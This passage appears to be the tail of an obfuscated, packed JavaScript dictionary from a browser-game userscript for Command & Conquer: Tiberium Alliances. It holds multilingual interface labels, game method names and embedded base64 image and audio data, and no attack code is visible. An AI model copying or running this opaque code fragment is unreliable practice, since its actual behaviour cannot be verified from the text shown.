QA89RnY2mRsxq6v8mY47gh8Fi8CF12XWcNKFvPLuSWOx4leJ9w0OcjsfukBwPHpsMbE1nN2p23iOXsX3N5kA0Bl2mSr8sbw7h|zOo2|I6CJjULNMTu5FkpycDMToT5lx77IkA0PRZVVYpKere415Ms1c2X3K|LeSa6hJrEa1t6j8IgYAZ5X23geA|JqYmofYcX5zH|mFrnfa|InLvRwY8N2m7GWdaeKr4CKJupdqSbcpe84bAuZoKFRVQ0yIuRChYnVmvRXVipKMAcIZl8oAMq|ichw3BwhOqWlhEbHXKq8uIyD0isn|XYotzfQTWDC|fyqjHbw28jJaDlFTeoMhsNiq73s7PWHosYQRJMleK1lL8e19AodiO|32uaYzYaSEzkXFyOMq8lrv16PC3ju1Dmor79hMYSGZ2VplRc|Jk9X8pXeFtU5Zcram|0RuS4m1f78uc|JBiWQqsYurxy0XFxWbq3U7YKUn|MEeIH8tkPq21wDKpfirVzi9Ii|sQa2cbr003Oyu7tcTGJUDooybS|efqKaRrb1KytDyfCn|oLaqdVE|qYVW3puJRH9h329LDb7VJS|e7Jx5Nrii3vG|52vAUxRKWIsW|9xLtISjsQXCAWoQWR|ppEN9nT0a91yCLD3LFkn7p7eHl8N43xdZItDjpY3BjP4cWWBjHMTA3hCQAgLoRGGYOdtapsXEqZgumO749yha4bc6|4xzbyrXR|j6qc9uP53|kZw2saJLqRlNTUL6iLxxG7eR3SliEVj2AfHEVZZAbMv1ZdbCIjoJo1Z|paQilADQKGHuO1IB63tkovL75ulPpz1ugw6nEWb47HFv4lvyBVXrfjSx8MT1ga4yx2fzO1doIkoCofXfaRavXtHQ378|qqwMkTSkszuz|8EmMgpKTy5iJ6fJv7Q1DEkAQbJk95|YiE0K0AjCcr7|VbgxoBFRZK|kFx4kFAWrxp5FL32MtfjtbajdCt3FgD8SqiUhPlvz8WeJQmoSlZrba5KrycjPfT1X475v91ToGKppbLofAzNDBIExETS0SiZVd|nkZqvTJdzr0Ojt43vfPXM|8HrS4|KXmQC1c2rqbFIdHqz4ih5O2|RVxJLXUJGcEhqfNdf7vGXPg1ndbMbZDNKafdlybFpLbOtzuS1ZXEa4Joptf7chEbt0e8end97CyX3tj9MotFNVeXzKYuUoVDHHIZw8xed1lFfFRjzbhFvPdLeLvecj2VUUqz6ODrZUcbV|t27j1kF|Gm2NN5DU|RqBA0B5KMwFWWsZfWb5aIXvlEvYXuDajOm|64o|5K7AlCUcQ7sqSaEardxSkXYXlYIp1d6sFMUc0aEHduVFjoYQcO4UuT79b8RwazmU2fsvTSRX6kbSULbSpc2qZrTX07cvtMhqJM3RuDOmj8h7BeFP74G|KFmg5ADJ5qV0eupbHH53FKhsd2umqwMXh9FTSnZf4MMlcNeITLnL80VrMGF2mSI3t2IAqb|KLrg5G7OxNyaQNSr0omvTD7CgHYXZtVwCmHMk|V43P7y1b3fhnFp89Xe1KzXfvhMIWN4n0eTqxWeVnyOmBBF4voD8okVDNbLZ2543HZKo8Ol|omHYWtF4wn8v8rezs2LqQnroDyf4IWjgXQ20O|WqnZQQu4DaMUVsHfjlrQGjiQr6KaMd3hFOTLM7f0WONv5Gk14ULPRw8rhf|3vRpWb9yhbBM8aqypNazNjWiEPDeSLZZmWOH5I5gYpaqJohPhkcVBT0iGsgYi1ueOw9V2SLsbkZO0OkGeEGVgKouGzvSyZKDIT120cL631hDdP6jHTNbaXPYO9yVQ5zwrVGKbqkKnf0sUfMMYsP0jU81xEkw3PYRjKTjO|3wm|2aYVtsg5iqjRLRAbO7aOh5Tl14X30aKoR0HIiqZeytPp6iKVWvFUHkJpCmrH9XvN5XvlGEpZxm3q05E|SogAhbznUOKKgUFrEXN03Od9zxdVp4324iCQeoVkwnwyJxPjHJg9dyHsDsmt3TBGQFQjY0rlopdG0v7t|drmp8to0TnzeP0uvDZJ9HvTwrkKgNhRQs0R7zg8v757Z5AJqDaEhdr|G27y1lV5fHhY|7aL1fe8vr|vGa|lqnpn9793jO3DdxCoHv3y|Pq6en0n|lS9fFkODEFIZYb0y1TcsmcqAVVJ|W6m2rlj1Fd6m1Ua7|Radvw62S9Od|epC3Wnq|3wFlAIUGXWLx|Wpi6WT5BAFREt7Zx9VHu6jf6GWsLUkx0cPRwg5M|DQxJeoy6z8PscfrW|XRrSlATYxoNqm|mUxngA8R0jVAub5oFiN1pxAAqrNxOpx796flialz3OLteX38|GW79393z6N2jn38JQZC47H|j0ZKVfHEZ2P7tdqh30qJh5UkMD9cz8NjWdR7mltp84Q28kwOaMkRovLE7Dd1f6We0i|fvX|5LfHrw|rkjjSeUuiLbgcZo1P|Bzvvt8DringYXDGi3gU5GbBIuL9sp5xQx2dJVUN1foos3XsTBxQAvgfcNAFJ7e2KvKiKTo8SaNL04KLRRnzZ1gbBsRF5ZwA0mpVZsulFRHKk6XoTlc|10JdYcNzbJ|USY|delldxWNm4RAPwfVP45UwxvqclzmzO4eK2lkl20WxZo6FVYXiP4OHKL7OWZWPSWIrMqrS9JJM|gC699tkC|Lqv|CFuEYD0PDUv1X|lVZWTnj9cZLwtX0E9gp2r8XScNkjJ|oc0j5sTXmSZL9vulwy521n0etf|uv3rDP|oImCBU2JMQ1ioolJY0YfkUrbPNk|qmQPktaechfkOgAlweM8r|5U1TuPcxhzpEb601m9aaslXom5flK9a|8ZBGK8xLbBvhxIj7NH2mIBebRwWeQ5X96TYcs48cCq4DlhcbBhHH6BUuDCV4cVXUH31w|XqWeyzU6|Z6ebddolZO3UfT6Lp8|JJBLtOhZrTlJKpNVNbdqMdgIkWxUHWVuhpfR1g3X7rHil|zqGJllNQgkRFf|lqgTBMSylmCCWXCR89xfR|GTc1ez95|mmWxGtfkXMYqEz5zvMompkHF6dKN|eRJiG81ad|3hEntT0FuJiB2GmYjcHHFtIefRVq0jIr34|9pZ0P3LIgjzO9rJbrQ45JdMg54M|kmsmEfGbrERMVfMjwjzWFatpiHCkSwWqqI7pVx7iJmbdUV55CDkzdqwDIJycwTs6NOZVy5oI|aiWyqI|PNQWwZ|P4guJ95C|Q0yH7q7rMuFhAEqLpp|U8hdVNqEyGTXgZ9DhVWdRy95eZkSQBle09ya211OyLEH72HimPxXTvrB7yj1okp1hTB|MYaqf3bJvsEI1lNM4n25NnX|WNKfs6IAQQ5qSTcpNn9XXYAT0BVvBLykJm2kE|gyw|bisvR62L|zdnSwKDejPZ2uNXI55oSdEzG88d3W4fGo3kOFJCYkrOvviwFQ0SUJUYqett6Kep2DdZMVdF6|Pi4l0gDFCZ|xri7s78htK0KFuOyNnnpKU6t7pTd|VvUvZLIxiaLLq|45kCXofhQL1fiUP|TADp1PZS8bWsSl98tbVh8phw2|qbWU7V3wN6dVx3EpR29B3au73eBuw4WG5Rd|viaMVIbaUVPW8F3wlVJBDWvAK7OT|7p8P2poQP7bxHRSSuQJNKjwe2S|eDY3zOq|Ohita|Anh5zy9clQ549IRvq7e92Ry80JElNkjkdUob3QBNWmK5kHQDEyxVTHt3m|u00e4lkeinen|voittoruutu|u00e4pin|ikkunan|hIviojl7JqlQB6ZmxtDo7HJSCx|jrVTYaDegKHujL8yFd2CseLwveeUey8RHzhqCT4fo5OYJe3EBnABhrLwCAmSJWVsLD2ownfXUbmzGoFjO33xiRYnu3n48oBTd0j21G0UrKJFWOkxFt4|pFV7Gtc|rR7x9fk0|Tuplaklikkaus|aktivoi|u00f6t|deaktivoi|u00e4kyvyys|aGxJSvqSKPG8Een8xl|Kumoa|valmisteluikkunassa|Tee|uudelleen|Pj5N3g3NfQzbZ|KNwoCVi7uBSWDz2xq2MQnJ|zsxHqIONz1M2e0ALxLSQANhIANFWVGcqmAmh7rb7M3I|eaKW9tZFY|muodostamisikkunassa|u00f6iden|XJyB8GblJKqDlqSd0gX77N7DidKEsYRopOB8qSmRxI9DsVtZPeiGgcnCDgYvKK9MQ9WlgJtS88nZlK7|GmqjsYo8PcParRDDBC5PWKc1NyYR7J2X||FabcM|37btBaohTwCyT|zum|Klick|10DOYE9ocJuB4rv1dlPN6zcrBi6Q1exbaTvofRZXFwov3Y8Xr2tXRYKm|ya0Day|ktLmW5fZNao87ALZCgcoRlb9vDqC39I3tB71P9qVUvKOUjL67H11TFSKqPZx9Xj|GxMk7uE9ZWvIz2WUc|1HBWGSWmFV8WgGag7BDlneF7NbUotwkpy7XQBn2l5|vbcAvqfbUCFokis8dHinDPH57RAhDszhTFyNCUDQe6teANTMoNL2VpZI|2dKJpQK7yf4A1vHF6YuJWl6qgInQaxsrDCPn5|UlvbMxpI3r2de5I0x161dEKJLlT0fNks6vAdzEd|oletusasetelma|loppuun|vaakasuunnassa|Vertikal|6wp|pystysuunnassa|gkyg|Wpbu9fHDFFgNWGIncsIfgmh||alue|kohteet|kartalle|q0GlM6ZvJ37pt9|Doppel|PZ4f8rGWJGi6eH93zRnJ99HWeVacvf5buEYo6T9peOMImQQyk7Gxf8azKo4ZopjrgogcFGyWV0Rf5tx0hZQunCWMG3WKXmcdnjhA|tallennetut|Merkitse|Gespeicherte|Versio|Ziele|der|Markieren|Karte|Xf5|15OJufjLluqMbPuT258gGSm2BE9nZ1MABHt4AAAAAAAAxjQAAAMAAAAknZ7hEPTt6|JGr3PmCkFqDrp7ffkf2HGdayKMwlEr|I383XVb57PPCkxN1DpUny|Yev55CV8LMxPHi||kYkyp|1H1kpqATU0CP8JX|nwgA8U6khcV|DTPYDEvr305bPWbUV7o|SL85c1ccMj|3flvTbpTYz1bUY|Kj|xfVhmu|obtVcVHEVcYHL|efd|ma0CoB1WZO2||401CB91czUf558vh|g3voo|MX9ubTEwxdlsg9fKlDztQQ0TVgiVubcfrsuJAwgoOpPd17FeoJM74pc4GDg0GlrmTJ|DTxTwGLSf511t4TwgKrzWEll8KrmMOKw|LRhHl3FezzYkUVhCmWwDMAJBZcD5VT|MgSLT5ltPgpVpYDyxR03u2rCZHkjGnAIkR8hug61Pn3Nvwgq9MQHVbrr64S|TcPPFHA5dD626KzJg2otgyV1Yrx|kbsnhnGJcuuhtZ2dVUjy5P65ubbHDyyFSrK63|07IcnQcUbvlVCi|TDv9eD3d|fSMPLvGbM8S0AzmV9|5ulxSuT8iS6|NUISFaAGzTxtjPp|18c|3L6Vqw|Xvtv|yWlx|8fF3sSUQGqHUelL6S5pMu|320eOuePQTuTRXP2c8|appendChild|Impact|Wrench|T2dnUwACAAAAAAAAAADGNAAAAAAAAGaVV6ABHgF2b3JiaXMAAAAAAQB9AAAAAAAAAPoAAAAAAAC4AU9nZ1MAAAAAAAAAAAAAxjQAAAEAAACQEk9NDlL|Sound|head|getElementsByTagName|cC1bpWbU65i3gq|2F9z5kkEh9eVa920MMiEpIuLSNKDcpyqdRYfdfPygUe6lqM69f4m86Dzy5DJXOoFyFe9|QorXyaOd01WLVZezfZaVftKudblALSzZB1MI0aQl|0X|javascript|rmdVxtIY66mIlWFqfPKSubPt0|AAAOESAiIjmMDI0Njg6PD5AQgIAAAAAAAAAAICAgAAAAAAAQAAAAICAT2dnUwAAQDoAAAAAAADGNAAAAgAAAI6VwgUsNzcxNCw0NDEzMigqJzQyMyspKyo3Nv7i8Ozg497p5SgoKCcoJigxMjY29|60KESpQcu8|Lbk6fUo3qrUQMWxHF16jAOQwKTRzU6|dhxbHae|ecxYkQnMCat5MrBrWeATD8mJePwPlxvSeApkEnm65rK2XZaoqMgdXsRIEP1kCDCD81xU5p509PQcAqrU0mLGTtWohLlCJLL|x8rRJ1kH5UfXMhrAv2Hk9Iop1Z28T7EKoBDhx9sgHdrdxAFTD17C|vVPclwMMRVxEs|HO4Xvo2We7V5bRz2BOxbZKCKbBS|wBcRSUQwoIYHcI5UR51H0J7Va5ydH3npel4|flxCRZoWX|Q8i2Eaq8cHq1T7|vnCTK1FbMKAar2Hnlj|eHYpP|TjN|tGla6gOHVWV3scT|wUxkUjh525ZEtH8D4|u00e7ar|get_HitpointsPercent|mKeeqihJei|ShowToolTip|5XrxU3mc8qRSEaOFHy6vVm191onsFIt|das1ctWBxZaShuDcrW68Uk9HixH2wZ2fwZGbf8lgSUFXldVGUn24TuxYVRb5P|HTY3p|RPOeFwqgQ5|lastIndexOf|substring|Veh|dMtTHEg1|GetResourceCostForFullRepair|anzeigen|r1laeb3Y7zzlsmzkvdxXdhj5NOxVZeI42QLUe9I5GCGsS7iUj3cDjCLB8SWJglKD7QyLAqFLvuWkwVGxbnn6YUhBZKLR|get_ZoomFactor|get_MinXPosition|clearTimeout|L6je8bvPanHYRsWPjXyHtUvFDhWKxR90myKcrv0MBx46FE|788OURV9VZyWcbKcZePgwcou5DXR67WY0jRuy14nlnZtd|RVb2jnFK2uYU8B7K51yS5WrYVhG6VnTdWefQ2DNRSKwf2N264SI0esB|wknje65S2TG28RmsGQTjK3gidzpLNNMadS9yGQpnF1Vg4pt0Ab0L7||9jQ2pP5|uYZRlDIuQBs4HHrjGZ18PAhqclxWq6qSkkqQcb4q3z|3h9rqekn0vq1GwvRRU3kkYCSE|get_Mode|zySj9yXGKl|rS4eB9cTzwDet8lSxo3YguqESuU5jDFC6nbcFsY81ycUcwajbMmRYLFYPZv90o8rX2v2yjCJ|iUzIqrpggWmhWHiP7NXKXILKLi0h9eHLJqalHFC9nXs5XWEQ|blQFlgInKyFWns6TZOnvqMQUoRy6eiAuhA|nullName|AutWf6V7Zq3dHU|9YVdrVqQk9PT7r1B8fJd220e0fU2RaMaYv23meioe19hrf1yXOqkWqklgdZJAtBNScfN47Jk2mMoH|getDateFromMillis|20q6i03VLX5HDYN9GezQyYzqC3Ttyp111hrf|h03VPrhB|0drFJG2IpIjD|vNL|9f5BNrM0o3Xcrz44fsfJYcmDGsBAwKNz5DWRNiNjyxmdog0bQAPKxuXTSpKYlci6iqe92TgiNpjFj1pHGKMleIgodLrjIhKfx1bvn9WxcxVMx8EbLT|dD5EfGZo|run|HmJR04Nab7K6Yqje4WGrjDZ|PVx8vzqyL30LA7Oarz3F3zj9S3oKsa1DkWtVIucczPGaT3fBbSd0KA6pHpJbj|392583|gvaeTAAAGVUlEQVQYGQXBeZCWdQEA4Of3e9|NvvaeFv||iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QERCx8kSr25tQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAABmJLR0QA|3O3aXD2EBAcFWQcyLQ3Qcwxs88koJxXQ0y7QcTRunsfJIM9HRmTxIKrzKP|IqybPySscZdQylVZTEVRLDDeQS2F2W3e97fz1PSCmBpYuuSXMXfhcAAAAAAAAAAAA8t|F09c8xsZmTxRlVviiHa5ch|PGjvPLoYmlgk5H1YGSFehFUY1CJCOSRPBADWRZlyAIlWmi26GuyY6i0dTDZ1Fcq62PM|9xLQrjrlmvS|yPrrz6hgAhpWTJomvSmAmjvfDwYkM7NmorgmpOFsgCMRIBRQwgIIGglLRKBlsMNpMdQ0llxFgnnXuFotYw|1SOMd7iacX|4lLYAqkRVFBZ4XygGAj1wBtiB4on7jLJKxEbuL1s6TXX0G1qZsRVlUegZ7pDub0Y|u00dcss|u015fman|Feindliche|Inimiga|Nemica|Statistiques||Statisztika|hu_HU||nl_NL|fr_FR|fi_FI|u0130statistik|Vijandelijke|Ellens|Defesas|Verteidigung|Verdediging|u00e9delem|u00e9fenses|u00dcniteleri|tukikohta|u00e9ges|XQRAB8Ps|Ennemie|Vihollisen|it_IT|pt_PT|ymDBjht5tyI9WmNqOLM6rtA6d|NX56zHIEipiYeuYIl|jTXtCjuQjFzeMrIeaMsFQeElggXBY2|SendCommand|Pc5RvzXI29OLsTxdhGIH3LMa3l3MskGAWu3J3FpuInC45fjugdjy3WMLcbI586zuHGlK6ohW7xVUZ0fqjBX7dYTiN7223WNKPT1oaU1k|UV|boV5mT8CI2P0IVPGLtmU|PNL1IiV|7Hd2b6dHwuqMS|mode|entityId|cityid|MbqYz8Sody91GgCq721JqpSC3BjaKUuT09TMydQ||CNC_Audio|wmaRznMt7P1vcfCjfjpNqw95TLi7b2UANquIGEdsyWdmOy9uns5BEY9dTllbvkPgb95JkiPDL3eD2yNzk6ps7NabwfK|ZhhWJG8S4NXpfJy6m|cloneNode|tr_TR|de_DE|loaded|qEZNxAeqoppgVcsROZMvVT3bBDx3G5GrscvyyjFOkio81sELLqqCxP06zS0nY9jSGMI3xFidiGlWwoOkHwY5CCEHgDc4nLJS9zrwPFWlDsl9yutgCdMZir2mi3agemvadZK5Cz432pDTgF6ADNLjg|postError|play|GM_log|mgN9h6N|avi|IsOwnBase|DL3QiyLAohgBxCpCiCLI9qBSqBeqAj0shornHer2caLktzZz7ujt|PseaK1|sound|Reload|1nlz9pDeDIPfndsgWqExqMrrGmx|13cJubX76QbDVbevhgkP|uBCknKYlADkUMijyq50GlktGWUYs0MnbL2W0v1tZM3HuUM84ZcNNlr|ML8s17Ribd2fp9aovYR1UAWiVEWW2IW5CEYRoQYqWRUMnS2cex05pxE15F6u0vHjX|Ip4DNm7bb|1pBIlMZAFURRDFGMpIYcsCypZ0F7NqAbqkVE1xlXZcwobGuZ1PeRTPPb4sVav|frm|vlQ8dq7FYjW4|eLObBAUAD|y1C8UTQHG9vbyK9vj0RDizko6qqYXWVRdXoOUfha2CeLgDAYroAsN|7ZqzMfwv75j9vXQY4xh7|usqts9ZPkasx595fnYc45o69vtvDq6hbhVQRz5Est4KyIg|yetE4y5eaX|wPu2oRLAxR0Ux76q6otUIfOkf4pZiVk2yhtJUuZ0pLCtMWl5dnWJb8CYg9AFTlHjkODEYAH4HEnPntnG7TQypIH4AY4zUI43BCXvOOcyZOaUoERQCACAq2|zrzUjrfvopAYX6hRbRVYvZ9fDyALrzEu2cfMP1WsbvlNtcyHzkY9M7tXlEYZTn5|removeListener|lp5unD|L4Z3R3n|wkAED1y6omS1iQXmdI|CRY6vM0555x7|lYn1dXVMK|pointer|EUCm3FC21Ib3g|ede9bF6gB4EvM73qAPfYV26pSIIYEIqTEYBkMr|3JVv6GM5Hg3D3bTemqZMb3vzLEiPCNqPaokY9qudEZDkpkRIEECQhEGKQA4iaqbSzybaB0pb|g6gJFj2mltZXCYZh|0tZWw|FnXmZEY4KQUrL49l|u1pRGsbWJ97WXv2XaiBmpESJsgRiJA9kIZC1eHQ5liubpR1DpQ19pc|9aZOXeqgbVf2NlMmgkIPT096cGrDjWlMzels9A1OjPulNnCtAOFkDHUy4oPWLeeBAjIAhAiR86ic38pRSkN2tndbdVT3Xo2DevZ2HTRHcvlMJSNsrl|LZlUyZJEbKBEQYKpOhZmn7LlKrIm3bYNG3XzSUuHD|2zjsxaftvj0Q6OnRA|1J7f70bynwVfb0DGB|7p7dfCVbVrBuJ71DrBti3TBvvGH6iaM98uTJJqIT|usLGO|kqZMbXv3TPYrmVrUiquTkAhFQAgAiARAAJYaa7BwqDWa7Oeasy4kNJy|8KISUElh656I097SFAAAAAAAAAAAA4O1Xn3PO964M8H8RODTRLDM3YgAAAABJRU5ErkJggg|49QAaxInHLTM209uYv|DiYE8qGYUkTwEECHGKM9w|PS|0H0BEEciDPCOPhABEqISglmeKSsa8mR695xNHhbsdEpY4atZTPgMcPyM64dJj||cursor|DSvLfvcdTeu0osvATBvevTb7qvxodnfmOSGm6cD6Md5Z|7806|transparent|T2dnUwACAAAAAAAAAACpAAAAAAAAAJKfvKcBHgF2b3JiaXMAAAAAAQB9AAAAAAAAAPoAAAAAAAC4AU9nZ1MAAAAAAAAAAAAAqQAAAAEAAABQ3ZLQDlL|7DR68NcMQhRLIsk8dMzAKIkATNEJg21R9uedOJB1e89NYCx88oANz21PlYhfX42FnXLjCzE4AWzj36aQNbOpgzQ8yDmAUhRhChFZJUYuVHHvz3lZa8c7Gu6ckP7|bytes|AXLVYc1|jLDyuIlVWqTcxIgai|YMLERfdEXjOgP2orggetPFaGWB|UiqBdRHNolTBvjriv2tRq|xLnrILs9u59udfU5|tgYhCsXuDUNvqsLlUIceedfm1srqiYwnNULfUBmfmzd|HNteXNQN10g5CECRIujhCijZTq8FsJbOGo3ATzr31oagedSdhwY75ikWtCCSywt|vEzTJ|GyILROWNyxhV8ZYz3u3vtQobHnj|36DIgzwGEKESKSK1SFukvYIc73WbfXKn39w6y0nffMGX72HCfprvdzhh1mM|oz1qLtmrym2lzS9O3a9BdwgujXbrfEGzkvapObBcQ1BEeNc96P7kcfd|7b3he18wutZw8AyLEEBQxquZBrcjUJd7pNue0CR5ZfJjvXL1c74ctDpzBpIK99mH9WHfdvgrAkr9tcfqlr1udOOP8Wfo|4RTF3Z56OZZlr641T9f28RhMxibMT5nj4zxNRu39oMW7lz0klXvtZzSda|bAYfmQmTSgnkm7d7QVolqRQAR8kiRU2RUczbc|u1UI5VINTCiw66yw|Cyan|4uiZzj9GiBd3hLUfrNJUQLjK2YeZejjx|ydm3p7mte9t7HyZ6juf|SB|Flg3IcLy5U5eMUlFrL|evidZbPgU0k|Zcwxs2CIZtLPZ9NmWTSB|4PpT1YugvcKIWrDH2Jr6lwMuvukd|QMbiV|GetObjectFromPosition|get_IsDestroyed|K5dy|Orange|O9Ke5|eECSlzOzIk0vzXJhr4zPoh|V4zZ0z7FrM3So1166RnlqoG9F0zFcIACABXtdRTRQAQgcAHjGsHna3Vg6zFf2e1ntWVV|Jl0ZF9S8RfqBhbq5ji2LqNcqEb|aUFWtTXYIefImaXiYP3XYmpV6ur4X1NcJLiW3EuKShAHUEr2b|04FC5WrQ|JjCQNFERNPJLftL0Pq77GNT1OTvXe0|Wo79njR|R2Og5Wph7YPISuWF8XX|qyJ9Vw|1YialWOMk|0k8|RIBFWzdTjEAwNS|8DRl8|OsZOj||get_Region|get_Server|get_MaxAttackDistance|WImoxAcwvjTO0w5jNet8lKxwcANkyPNCbUybGxwers7FNH5sxRpUxJ3oGWkL|t7NMmQByCHPgyJSL4L2epTVMjoCHRn|kkD|R3ryW2NpTce5KBTtyzoJ8yR0eu1qcmcl|Vc2bLNUdo906OtCVEcV7ve13cnIXsDuGj7A2z|get_X|get_Y|Puolustus|1HdNeUVc2qwD78PFJIei3LcbeX9VlZYjaCPrzqRaDqWdKlSM50Tw81aDnqxlovnFwN4pWZVe7rEsZ1iurmh87H8iFoqMPxeeVYsezSCqL9P8plYISsGvbkBzhjQZyPJSXl1FnlKgAep9qoxSDzDRZMRfDIfR9mE02bYfXptNkzDFamymfKBt1jjTpwTcNnR25Sb|u00e4hltes|Gew|u00f6ld|Kaydet|Speichern|sil|Nimi|u0130sim|yoejoOVS3D37YdPXi94Mhbo2rUMMe91GfB1C8|Naam|u00e9v|Nom|Opslaan|Ment|nykyinen|Mentsd|Bilgi|b794k0Uc0aU7aGy0p6eIozfKT611FnZ2P8Hl|Infos|check|opslaan|Y5Sc3CwyrNmCv6ecUOnzTGyiy2fxSOjhol2e2vBhBfZTCQM6un|OSa47ETpp9nK2q3u1xZ8Di|kaydet|speichern|Deze|u00f6rl|Sil|set_CurrentTargetBaseId|Binalar|Gevechtsduur|ideje|Dur|Batalha|Kampfdauer|Inconnu|ijIHtNCAANXu|Tuntematon|3NNGMn94ww9fVZ6VY3Hs|u00fcresi|Taistelun|kesto|u00f6lt|Laden|Gespeichertes|laden|u00f6ltsd|Asetelmat|Dispositions|Dizili|Forma|Formazione|Indelingen|Tietoa|u00f3runs|Strumenti|finestra|Dit|venster|Ezen|177|111|otomatik|pencereyi|Dieses|Fenster|caixa|aut|u00f3matikus|151|u0131rma|112|u015flar|Bewegungstasten|Kayd|fnkHvtfawKZ0E5eMCyUsjk|cette|Fen|u00eatre|automaattisesti|159|Asetukset|Bottino|u00f3lios|Opbrengst|Zs|u00e1km|bAemS4GOeEC1oF|Esp|Jq|u00f3rum|Keskustelupalsta||Ganimetler|Rohstoffausbeute|Butin|Sotasaalis|Opci|01j3Hnb5et|u00f3k|NuniY0JGORp8TdctVFdBeNmcSEe8bp6S|6XLpRW4zGeu6lQuNLS4ru5ASWPPlSnZ5dCA8Q0C1swFsCXWl46I9ANnTECqiX2HP01t1ejvNPMt76finmyfvMOO43TNbf68GErHcT19c|Opties|Opzioni|Se|u00e7enekler|Optionen|Op|Ismeretlen|Battaglia|Komuta|Puolustuslaitos|Merkezi|Kommandozentrale|kQcfnols0s|4HqXLpFk5QB1Zpp7ZBwd0yrP8PpgqzZsa9jxG4Cn5innikeYqqXH8XTKbwmRxQY91t7im7Yd7uhhTlBQLU8kPSlHPa4lZQLp|u00e9fense|Defensiefaciliteit|Stazione|u00e9delmi|2BFvhcj59PTzNFJD6p84bV4XhRkEOwO0HliC4lTU|Complexe|Commandocentrum|Parancsnoki|removeAll|u00e4yksi|Onbekend|flbMgQVierqZT2Fp3O8KkdX0M|Gesamt|u00e4ljell|Korjausaikaa|Centre|Commandement|Komentokeskus|ListItem|Defesa|Instala|gsLTU1Nfbo5ikzNTQzNjX017Qc0MHayNpfi94O6u2FMqBqfecfb|h8AAAAAAACpAAAAAgAAABjIRxMcMTMyNDYzODg1M|Gebouwen|u00c9p|u00fcletek|Strutture||u00edcios|void|Geb|AAAOESAiIjmMDI0Njg6PD5AQgIAAAAAAAAAAICAgAAAAAAAQAAAAICAT2dnUwAE|u00e4ude|Edif|u00e2timents|7z3LLmIA1w1fpZfVdl52kwPupvVY6jzALlj1m0HCkyjAXx9T1FHctGA6rWUDFnmX|Chantier|Bouwplaats|Rakennustukikohta|Tesisi|Verteidigungseinrichtung|WuVEV|Cantiere|Rakennelmat|u015eantiye|Bauhof|Estaleiro|Geral|u00fcm|u00e9giero|Totaal|Avions|Lentokoneet|Sonu|Velivoli|Avi|u00e1rmu|wipeUndoStateAfter|u00e9hicules|Ajoneuvot|Hava|Ergebnis|Resultado|Unbekannt|Bilinmiyor|X5sso7HsURpd7ap5qq8EE8uCm8E1OePzbgC0MMdpaCK|Desconhecido|Sconosciuto|Lopputulos|u00e9sultat|Esito|Uitkomst|saveUndoState|Eredm|WupfpGHgD89JinxI4gGr7dvuOHNc|Vliegtuigen|Jalkav|Yhteens|Fanteria|Infantaria|Piyadeler|u00c1ttekint|Motorlu|Gyalogs|u00e1g|Ve|Voertuigen|u00edculos|Veicoli'.split('|')))
 
